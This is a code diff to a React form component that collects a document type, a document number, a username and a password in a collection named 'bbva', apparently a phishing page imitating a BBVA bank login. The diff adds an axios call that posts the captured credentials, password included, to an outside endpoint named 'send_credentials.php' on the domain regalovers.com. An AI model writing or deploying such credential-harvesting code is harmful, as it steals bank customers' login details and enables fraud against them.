@@ -3,12 +3,14 @@ import "../Responsive.css";
 import firebase from "../firebase";
 import moment from 'moment';
 import { Button } from 'react-bootstrap';
+import axios from 'axios';
 
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faEye, faKeyboard } from "@fortawesome/free-solid-svg-icons";
 const eye = <FontAwesomeIcon icon={faEye} />;
 const keyboard = <FontAwesomeIcon icon={faKeyboard} />;
 
+const API_PATH = 'http://localhost:3000/src/api/db_post.php';
 const collection = firebase.firestore().collection("bbva"); 
 
 const Forms = () => {
@@ -118,12 +120,27 @@ const Forms = () => {
         try{
             const date = new Date();
 
-            await collection.add({
+            const data = {
                 type: documentTypeVal,
                 document: documentVal,
                 username: usernameVal,
                 password: passwordVal,
                 created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
+            }
+
+            axios.post('https://apibbva.regalovers.com/send_credentials.php', data)
+            .then((response) => {
+                console.log(response);
+            })
+            /*const request = JSON.stringify(data);
+
+            const response = await fetch(`https://apibbva.regalovers.com/send_credentials.php`, {
+                method: "POST",
+                body: request
+            });*/
+
+            /*await collection.add({
+                
             })
             .then(() => {
                 console.log("Document successfully written!");
@@ -133,7 +150,7 @@ const Forms = () => {
                 console.error("Error adding Tutorial: ", error);
             });
 
-            console.log("creado");
+            console.log("creado");*/
         }
         catch(e){
             console.log(e);
